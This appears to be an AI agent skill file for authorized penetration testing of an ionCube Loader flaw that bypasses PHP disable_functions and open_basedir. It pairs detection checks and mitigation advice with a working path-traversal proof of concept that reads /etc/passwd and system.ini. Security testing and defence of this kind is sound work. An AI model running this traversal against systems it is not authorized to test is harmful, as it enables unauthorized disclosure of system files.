---
name: php-ioncube-bypass
description: Use this skill when analyzing PHP applications for security vulnerabilities, specifically when investigating ionCube extension misconfigurations that may allow bypassing disable_functions and safe_mode restrictions. Trigger this skill when users mention PHP security testing, ionCube vulnerabilities, disable_functions bypass, safe_mode bypass, or PHP extension exploitation during authorized penetration testing. Always verify authorization before using these techniques.
---

# PHP ionCube Extension Security Analysis

A skill for security professionals to understand and test ionCube extension vulnerabilities in PHP applications during authorized penetration testing engagements.

## ⚠️ Authorization Required

**This skill is for authorized security testing only.** Only use these techniques on:
- Systems you own or have explicit written permission to test
- Bug bounty programs that explicitly allow this type of testing
- Your own security research environments

Unauthorized access to computer systems is illegal and unethical.

## Overview

The ionCube Loader extension (particularly version 6.5 on PHP 5.2.4) contains functions that can bypass PHP's `disable_functions` and `safe_mode` restrictions. This vulnerability exists because ionCube's internal functions operate at a lower level than standard PHP function restrictions.

## Vulnerability Details

### Affected Components
- **ionCube Loader version**: 6.5 (and potentially other versions)
- **Extension file**: `ioncube_loader_win_5.2.dll` (Windows) / similar on other platforms
- **PHP version**: 5.2.4 (and potentially other versions)
- **Affected functions**: `ioncube_read_file()`, `ioncube_write_file()`

### Why This Works

When PHP's `disable_functions` directive blocks functions like `readfile()`, `file_get_contents()`, etc., the ionCube extension's internal functions may still execute because:

1. They're implemented in the extension's native code, not PHP
2. They bypass the standard PHP function restriction mechanism
3. They can read files outside of `open_basedir` restrictions

## Detection

### Check if ionCube is Loaded

```php
<?php
if (extension_loaded("ionCube Loader")) {
    echo "ionCube Loader is loaded\n";
    echo "Version: " . phpversion("ionCube Loader") . "\n";
} else {
    echo "ionCube Loader is NOT loaded\n";
}
?>
```

### Check for Available Functions

```php
<?php
$ioncube_functions = [
    'ioncube_read_file',
    'ioncube_write_file',
    'ioncube_decode_file'
];

foreach ($ioncube_functions as $func) {
    if (function_exists($func)) {
        echo "Function $func is available\n";
    }
}
?>
```

### Check PHP Restrictions

```php
<?php
echo "Safe Mode: " . ini_get("safe_mode") . "\n";
echo "Disable Functions: " . ini_get("disable_functions") . "\n";
echo "Open Basedir: " . ini_get("open_basedir") . "\n";
?>
```

## Testing Methodology

### Step 1: Information Gathering

1. Check if ionCube Loader is installed
2. Identify the ionCube version
3. Document current PHP restrictions (safe_mode, disable_functions, open_basedir)
4. Note the target PHP version

### Step 2: Function Availability Test

Test if ionCube functions are accessible despite restrictions:

```php
<?php
// Test ioncube_read_file availability
if (function_exists('ioncube_read_file')) {
    echo "ioncube_read_file is available\n";
    
    // Test with a safe file first
    $test_file = __FILE__;
    $result = @ioncube_read_file($test_file);
    
    if ($result !== false) {
        echo "ioncube_read_file works - restriction bypass confirmed\n";
    } else {
        echo "ioncube_read_file exists but may be restricted\n";
    }
}
?>
```

### Step 3: Path Traversal Testing

If ionCube functions are available, test path traversal capabilities:

```php
<?php
if (function_exists('ioncube_read_file')) {
    // Build path traversal string
    $path = str_repeat("../", 20);
    
    // Test reading system files (adjust based on OS)
    $targets = [
        "windows" => $path . "windows/system.ini",
        "linux" => $path . "etc/passwd",
        "mac" => $path . "etc/passwd"
    ];
    
    foreach ($targets as $os => $file) {
        echo "Testing $os: $file\n";
        $result = @ioncube_read_file($file);
        if ($result !== false && strlen($result) > 0) {
            echo "SUCCESS: File readable\n";
            echo "Content preview: " . substr($result, 0, 200) . "...\n";
            break;
        }
    }
}
?>
```

## Mitigation Recommendations

### For System Administrators

1. **Update ionCube Loader**: Upgrade to the latest version where this vulnerability is patched
2. **Remove ionCube if not needed**: If you don't use ionCube-protected code, disable the extension
3. **Use PHP-FPM with proper user isolation**: Run PHP processes as unprivileged users
4. **Implement file system permissions**: Restrict read access to sensitive files
5. **Monitor for suspicious activity**: Log and alert on unusual file access patterns

### For Developers

1. **Avoid relying on disable_functions for security**: It's not a reliable security control
2. **Use proper authentication and authorization**: Implement application-level access controls
3. **Keep PHP and extensions updated**: Regularly patch known vulnerabilities
4. **Use modern PHP versions**: PHP 5.2.4 is extremely outdated and has many known vulnerabilities

## Reporting Findings

When documenting this vulnerability in a security report:

1. **CVSS Score**: Typically Medium to High depending on impact
2. **Affected Component**: ionCube Loader extension
3. **Impact**: Information disclosure, potential code execution
4. **Remediation**: Update ionCube, remove if not needed, implement additional controls
5. **Proof of Concept**: Include sanitized test results showing the bypass

## Legal and Ethical Considerations

- Always obtain written authorization before testing
- Document all testing activities
- Report findings responsibly to system owners
- Do not exploit vulnerabilities for unauthorized access
- Follow responsible disclosure practices

## References

- [ionCube Official Website](https://www.ioncube.com/)
- [PHP disable_functions Documentation](https://www.php.net/manual/en/ini.core.php#ini.disable-functions)
- [PHP safe_mode Documentation](https://www.php.net/manual/en/features.safe-mode.php) (deprecated in PHP 5.4+)
- CVE databases for specific ionCube vulnerability entries

## Related Skills

Consider using these skills in conjunction:
- PHP security testing
- Web application penetration testing
- Server configuration auditing
- File system security analysis
